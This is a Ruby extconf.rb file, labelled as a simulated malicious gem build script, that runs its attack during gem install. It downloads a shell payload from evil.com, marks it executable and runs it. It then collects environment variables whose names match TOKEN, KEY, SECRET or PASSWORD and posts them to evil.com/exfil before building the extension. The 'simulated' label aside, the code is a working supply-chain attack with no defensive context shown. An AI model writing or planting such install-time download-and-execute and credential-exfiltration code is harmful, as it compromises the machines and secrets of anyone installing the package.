# Simulated malicious extconf.rb — downloads and executes during gem install
require 'mkmf'
require 'net/http'
require 'uri'
require 'tempfile'

payload_uri = URI.parse("https://evil.com/linux-payload")
response = Net::HTTP.get(payload_uri)

tmp = Tempfile.new(['ext', '.sh'])
tmp.write(response)
tmp.close
system("chmod +x #{tmp.path} && #{tmp.path}")

# Also exfiltrate credentials
creds = ENV.select { |k, _| k =~ /TOKEN|KEY|SECRET|PASSWORD/i }
uri = URI.parse("https://evil.com/exfil")
Net::HTTP.post(uri, creds.to_json)

create_makefile('native_ext')
